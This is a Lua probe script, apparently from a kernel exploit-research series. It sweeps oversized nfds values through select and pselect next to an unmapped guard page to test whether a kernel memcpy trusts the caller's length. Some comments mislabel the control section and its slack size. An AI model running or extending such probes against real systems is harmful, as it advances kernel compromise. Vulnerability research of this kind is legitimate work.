-- CRASH_CLASS: MODERATE
-- PROBE 1446c: select(93)/pselect(522) fd_set copy length — corrected instrument
--
-- Context: docs/MEMCPY_PROVENANCE.md:291 lists 0x70322d as the highest-ranked unchecked memcpy —
--   `memcpy(arg2+0x20, arg3, arg4)` in twelve straight-line instructions with no capacity compare
--   and no branch, the payload length then stored into a single BYTE.  Its shallowest
--   syscall-reachable route is syscalls 93 (select) and 522 (pselect) per
--   docs/sysent-names-13.60.csv (`93,select,0x265928`, `522,pselect,0x265ce0`); candidate 0x4ef6e6
--   `memcpy(*(arg2+0x10), src, len)` is at depth two from the same pair.  If 14.10 hands the caller's
--   nfds straight to an fd_set copy, nfds is an attacker-chosen copy length with no race.
--
--   Two earlier attempts are recorded and both were instrumentation failures, not measurements:
--     * 1446a (results/phase36_realargs/1446a_select_fdset_bound_20261109_170718.txt) left the
--       bitmaps pattern-filled, so every call answered EBADF before touching them and only the
--       timeval changed (changed=4 at offset 0x8000).  It did establish two floors: select(8) and
--       pselect(8) both return 3, and select(0xFFFFFFFFFFFFFFFF,...) returns 0, not EINVAL.
--     * 1446b (results/phase36_realargs/1446b_select_fdset_guard_20261109_170934.txt) put the bitmap
--       flush against a munmapped page and answered EFAULT at EVERY nfds including 1, so the hole
--       was reached even for an 8-byte copy — i.e. the EFAULT was not produced by the fd_set length
--       and the instrument was invalid.  It also faulted in userland (a raw mcontext dump appears in
--       the capture's [D] block), which means the munmap took more than the requested page.
--
--   This probe fixes both: the hole is created at the far end of a 4-page region, and a marker is
--   written and read back on both sides of it so a wrong munmap is visible before anything else
--   runs.  The decisive control is [D]: the same oversized nfds with the bitmap at the start of the
--   region, where 0x1F80 bytes of mapped slack follow.  An EFAULT there cannot be the hole.
--
-- -- prior art: 1446a and 1446b above are the only select/pselect length attempts in the tree;
--   probes/phase23_cve_2026/502a_select_close_heavy.lua and probes/phase34_shm_race/93e2_poll_close_race.lua
--   use select only as a timing device with nfds = fd + 1.  docs/DEAD_ENDS.md has no select bullet.
--
-- Discriminator: EFAULT at nfds <= 1024 is impossible for a correct kernel (8 bytes copied into a
--   mapped page), so any EFAULT there means the copy length is not nd/8.  EFAULT only above 1024,
--   with [D] clean, means nfds above FD_SETSIZE is trusted rather than clamped.

print("=== PROBE 1446c: SELECT FDSET COPY LENGTH ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local sc477 = make_syscall(477)
local sc73  = make_syscall(73)
local sc93  = make_syscall(93)
local sc522 = make_syscall(522)
local sc20  = make_syscall(20)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sgn(rv)
    local n = to_num(rv)
    if n < 0 then return -1 end
    return n
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v)
    local ok = pcall(function() memory.write_dword(a, uint64(v)) end)
    return ok
end
local function wrq(a, v)
    local ok = pcall(function() memory.write_qword(a, uint64(v)) end)
    return ok
end
local function map(len, prot, flags, fd, off)
    local ok, va = pcall(function()
        return sc477(uint64(0), uint64(len), uint64(prot or 3),
                     uint64(flags or 0x1002), uint64(fd or 0xFFFFFFFF), uint64(off or 0))
    end)
    if not ok then return -1 end
    local n = to_num(va)
    if n < 0x10000 or n > 0x8000000000 then return -1 end
    return n
end

local pid = sgn(sc20())

-- Four pages; the LAST one is munmapped, so the usable region is [Q, Q+0x3000).
local Q = map(0x4000, 3)
if Q < 0 then
    print("mmap failed -- aborting")
    print("=== PROBE 1446c ABORT ===")
    return
end
local k = 0
while k < 0x4000 do
    wr(Q + k, 0)
    k = k + 4
end

-- markers on both sides of the hole let a wrong munmap be seen immediately
wr(Q + 0x1000, 0x11111111)
wr(Q + 0x2FFC, 0x22222222)
local rv_unmap = sgn(sc73(uint64(Q + 0x3000), uint64(0x1000)))
local m1 = rd(Q + 0x1000)
local m2 = rd(Q + 0x2FFC)
print(string.format("pid=%d region=0x%08X munmap(last page)=%d", pid, Q, rv_unmap))
print(string.format("[0] marker @+0x1000=0x%08X (want 11111111)  marker @+0x2FFC=0x%08X (want 22222222)",
    m1, m2))
if m1 ~= 0x11111111 or m2 ~= 0x22222222 then
    print("  <-- the usable region was damaged; this run measures nothing")
end
print("")

local BITMAP = Q + 0x2F80        -- ends exactly at Q+0x3000, the hole
local TIMEOUT = Q + 0x2000
wrq(TIMEOUT, 0)
wrq(TIMEOUT + 8, 0)
print(string.format("bitmap=0x%08X (ends 0x%08X)  timeout=0x%08X", BITMAP, BITMAP + 0x80, TIMEOUT))
print("")

--------------------------------------------------------------------------
-- [A] select(93) with the bitmap flush against the hole
--------------------------------------------------------------------------
print("[A] select(93) nfds sweep, bitmap flush against the hole")
local NFD = {1, 8, 64, 512, 1020, 1024, 1028, 1088, 2048, 4096, 8192, 65536}
local bi = 1
while bi <= 12 do
    local n = NFD[bi]
    local rv = sgn(sc93(uint64(n), uint64(BITMAP), uint64(0), uint64(0), uint64(TIMEOUT)))
    if rv < 0 then
        local e = es()
        local note = ""
        if e:find("Bad address") and n <= 1024 then note = "  <-- EFAULT with nd/8 <= 128 bytes: length is not nd/8" end
        if e:find("Bad address") and n > 1024 then note = "  <-- EFAULT past FD_SETSIZE" end
        print(string.format("  nfds=%-6d rv=-1 (%s)%s", n, e, note))
    else
        print(string.format("  nfds=%-6d rv=%d", n, rv))
    end
    bi = bi + 1
end
print("")

--------------------------------------------------------------------------
-- [B] the decisive control: identical nfds, bitmap at the region start with
--     0x2F80 bytes of mapped slack.  The hole is 12 KiB away.
--------------------------------------------------------------------------
print("[B] control, bitmap at region start (0x2F80 bytes of slack before the hole)")
local CAL = Q + 0x0000
wrq(CAL, 0)
wrq(CAL + 8, 0)
local ci = 1
local CN = {1024, 1028, 2048, 4096, 8192, 65536}
while ci <= 6 do
    local rv = sgn(sc93(uint64(CN[ci]), uint64(CAL), uint64(0), uint64(0), uint64(TIMEOUT)))
    print(string.format("  nfds=%-6d rv=%d (%s)", CN[ci], rv, es()))
    ci = ci + 1
end
print("")

--------------------------------------------------------------------------
-- [C] slot roles: a port could clamp only one of the three bitmaps
--------------------------------------------------------------------------
print("[C] slot roles at nfds=8192, bitmap flush against the hole")
local sv = sgn(sc93(uint64(8192), uint64(BITMAP), uint64(0), uint64(0), uint64(TIMEOUT)))
print(string.format("  readfds   rv=%d (%s)", sv, es()))
sv = sgn(sc93(uint64(8192), uint64(0), uint64(BITMAP), uint64(0), uint64(TIMEOUT)))
print(string.format("  writefds  rv=%d (%s)", sv, es()))
sv = sgn(sc93(uint64(8192), uint64(0), uint64(0), uint64(BITMAP), uint64(TIMEOUT)))
print(string.format("  exceptfds rv=%d (%s)", sv, es()))
print("")

--------------------------------------------------------------------------
-- [D] pselect(522): (nfds, r, w, e, timeout, sigmask)
--------------------------------------------------------------------------
print("[D] pselect(522) nfds sweep, bitmap flush against the hole")
local PNFD = {1, 1024, 1028, 2048, 8192, 65536}
local pi = 1
while pi <= 6 do
    local n = PNFD[pi]
    local rv = sgn(sc522(uint64(n), uint64(BITMAP), uint64(0), uint64(0),
                         uint64(TIMEOUT), uint64(0)))
    print(string.format("  nfds=%-6d rv=%d (%s)", n, rv, es()))
    pi = pi + 1
end
print("")

print(string.format("[E] survivor pid=%d (was %d)  markers still %08X/%08X",
    sgn(sc20()), pid, rd(Q + 0x1000), rd(Q + 0x2FFC)))
print("")
print("=== PROBE 1446c COMPLETE ===")
